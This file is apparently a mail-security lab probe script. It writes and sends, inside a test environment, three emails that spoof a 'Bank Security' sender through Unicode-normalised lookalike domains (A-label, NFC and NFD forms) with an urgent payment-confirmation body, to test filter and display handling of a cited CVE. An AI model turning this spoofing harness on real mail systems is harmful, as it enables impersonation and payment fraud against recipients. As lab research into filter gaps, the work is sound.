"""NFD variant probe + display-layer probes (d1-d3).

d1: A-label spoof (control, policy found)
d2: NFC U-label spoof (CVE-2026-100891 form)
d3: NFD U-label spoof (decomposed combining diaeresis; NOT covered by the CVE
    writeup - tests whether rspamd's converter also fails on non-NFC input)

All unsigned, envelope alice@lab.test -> bob@lab.test, subject-tagged for
browser screenshots in Roundcube/SnappyMail.
"""
from __future__ import annotations

import json
import subprocess
import sys
import time
import unicodedata
from pathlib import Path

RUN = Path("/mnt/e/MailSecLab/received-lab/results/research/w2-20261002a")
STAGE = RUN / "nfd"
VICTIM_ALABEL = "xn--mnchen-3ya.lab.test"
NFC = unicodedata.normalize("NFC", "münchen.lab.test")
NFD = unicodedata.normalize("NFD", "münchen.lab.test")

CASES = [
    {"name": "d1-alabel-spoof", "from": f"From: Bank Security <security@{VICTIM_ALABEL}>", "domain": VICTIM_ALABEL},
    {"name": "d2-ulabel-nfc-spoof", "from": f"From: Bank Security <security@{NFC}>", "domain": NFC},
    {"name": "d3-ulabel-nfd-spoof", "from": f"From: Bank Security <security@{NFD}>", "domain": NFD},
]


def main() -> None:
    STAGE.mkdir(parents=True, exist_ok=True)
    meta = {"NFC_utf8_hex": NFC.encode("utf-8").hex(), "NFD_utf8_hex": NFD.encode("utf-8").hex(),
            "NFC_is_nfc": unicodedata.is_normalized("NFC", NFC), "NFD_is_nfd": unicodedata.is_normalized("NFD", NFD)}
    print(json.dumps(meta), flush=True)
    for case in CASES:
        case_id = "nfd-" + case["name"]
        headers = [
            case["from"].encode("utf-8"),
            b"To: bob@lab.test",
            b"Date: Fri, 2 Oct 2026 16:00:00 +0000",
            f"Subject: [display probe] {case['name']}".encode(),
            f"Message-ID: <{case_id}@lab.test>".encode(),
            f"X-Case-ID: {case_id}".encode(),
        ]
        raw = b"\r\n".join(headers) + b"\r\n\r\nUrgent: please confirm the payment instruction.\r\nCase: " + case_id.encode() + b"\r\n"
        (STAGE / f"{case['name']}.eml").write_bytes(raw)
        p = subprocess.run([
            "docker", "exec", "msl-client", "python3", "/opt/research/lib/smtp_send.py",
            "--server", "msl-auth-postfix", "--port", "25",
            "--mail-from", "alice@lab.test", "--rcpt-to", "bob@lab.test",
            "--input", f"/evidence/w2-20261002a/nfd/{case['name']}.eml",
            "--transcript", f"/evidence/w2-20261002a/nfd/{case['name']}.smtp.txt",
        ], capture_output=True, timeout=90)
        try:
            r = json.loads(p.stdout.decode())
        except Exception:
            r = {"raw": (p.stdout.decode() + p.stderr.decode())[-200:]}
        print(case["name"], "->", (r.get("reply") or "")[:60], flush=True)
        time.sleep(3)
    (STAGE / "meta.json").write_text(json.dumps(meta, indent=1) + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
